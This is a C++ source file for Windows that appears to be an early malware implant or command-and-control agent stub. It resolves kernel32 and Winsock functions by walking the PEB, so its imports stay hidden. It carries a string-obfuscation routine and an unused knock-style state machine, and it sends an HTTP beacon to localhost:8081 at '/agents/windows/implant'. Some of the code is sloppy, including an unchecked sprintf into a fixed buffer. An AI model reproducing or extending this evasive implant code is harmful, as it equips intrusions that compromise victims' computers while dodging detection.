#include <Windows.h>
#include "peb_lookup.h"

#define LOCALHOST_ROT13 ">?D;=;=;>"

typedef struct
{
    decltype(&LoadLibraryA) _LoadLibraryA;
    decltype(&GetProcAddress) _GetProcAddress;
} t_mini_iat;

typedef struct
{
    decltype(&WSAStartup) _WSAStartup;
    decltype(&socket) _socket;
    decltype(&inet_addr) _inet_addr;
    decltype(&bind) _bind;
    decltype(&listen) _listen;
    decltype(&accept) _accept;
    decltype(&recv) _recv;
    decltype(&send) _send;
    decltype(&closesocket) _closesocket;
    decltype(&htons) _htons;
    decltype(&WSACleanup) _WSACleanup;
} t_socket_iat;


bool init_iat(t_mini_iat &iat)
{
    LPVOID base = get_module_by_name((const LPWSTR)L"kernel32.dll");
    if (!base) {
        return false;
    }

    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
    if (!load_lib) {
        return false;
    }
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
    if (!get_proc) {
        return false;
    }

    iat._LoadLibraryA = reinterpret_cast<decltype(&LoadLibraryA)>(load_lib);
    iat._GetProcAddress = reinterpret_cast<decltype(&GetProcAddress)>(get_proc);
    return true;
}

bool init_socket_iat(t_mini_iat &iat, t_socket_iat &sIAT)
{
    LPVOID WS232_dll = iat._LoadLibraryA("WS2_32.dll");

    sIAT._WSAStartup = reinterpret_cast<decltype(&WSAStartup)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSAStartup"));
    sIAT._socket = reinterpret_cast<decltype(&socket)>(iat._GetProcAddress((HMODULE)WS232_dll, "socket"));
    sIAT._inet_addr = reinterpret_cast<decltype(&inet_addr)>(iat._GetProcAddress((HMODULE)WS232_dll, "inet_addr"));
    sIAT._bind = reinterpret_cast<decltype(&bind)>(iat._GetProcAddress((HMODULE)WS232_dll, "bind"));
    sIAT._listen = reinterpret_cast<decltype(&listen)>(iat._GetProcAddress((HMODULE)WS232_dll, "listen"));
    sIAT._accept = reinterpret_cast<decltype(&accept)>(iat._GetProcAddress((HMODULE)WS232_dll, "accept"));
    sIAT._recv = reinterpret_cast<decltype(&recv)>(iat._GetProcAddress((HMODULE)WS232_dll, "recv"));
    sIAT._send = reinterpret_cast<decltype(&send)>(iat._GetProcAddress((HMODULE)WS232_dll, "send"));
    sIAT._closesocket = reinterpret_cast<decltype(&closesocket)>(iat._GetProcAddress((HMODULE)WS232_dll, "closesocket"));
    sIAT._htons = reinterpret_cast<decltype(&htons)>(iat._GetProcAddress((HMODULE)WS232_dll, "htons"));
    sIAT._WSACleanup = reinterpret_cast<decltype(&WSACleanup)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSACleanup"));

    return true;
}

///---
bool switch_state(char *buf, char *resp)
{
    switch (resp[0]) {
    case 0:
        if (buf[0] != '9') break;
        resp[0] = 'Y';
        return true;
    case 'Y':
        if (buf[0] != '3') break;
        resp[0] = 'E';
        return true;
    case 'E':
        if (buf[0] != '5') break;
        resp[0] = 'S';
        return true;
    default:
        resp[0] = 0; break;
    }
    return false;
}

inline char* rot13(char *str, size_t str_size, bool decode)
{
    for (size_t i = 0; i < str_size; i++) {
        if (decode) {
            str[i] -= 13;
        }
        else {
            str[i] += 13;
        }
    }
    return str;
}
bool make_http_request(t_mini_iat &iat, const char* host, const char* port, const char* path)
{
    t_socket_iat sIAT;
    if (!init_socket_iat(iat, sIAT)) {
        return false;
    }

    WSADATA wsaData;
    SecureZeroMemory(&wsaData, sizeof(wsaData));
    if (sIAT._WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    struct addrinfo* result = NULL, * ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(host, port, &hints, &result) != 0) {
        sIAT._WSACleanup();
        return false;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    ptr = result;
    ConnectSocket = sIAT._socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

    if (ConnectSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        sIAT._WSACleanup();
        return false;
    }

    if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
        sIAT._closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        sIAT._WSACleanup();
        return false;
    }

    char request[128];
    sprintf(request, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
    int iResult = sIAT._send(ConnectSocket, request, (int)strlen(request), 0);

    if (iResult == SOCKET_ERROR) {
        sIAT._closesocket(ConnectSocket);
        sIAT._WSACleanup();
        return false;
    }

    sIAT._closesocket(ConnectSocket);
    sIAT._WSACleanup();

    return true;
}

int main()
{
    t_mini_iat iat;
    if (!init_iat(iat)) {
        return 1;
    }
    make_http_request(iat, "localhost", "8081", "/agents/windows/implant");
    return 0;
}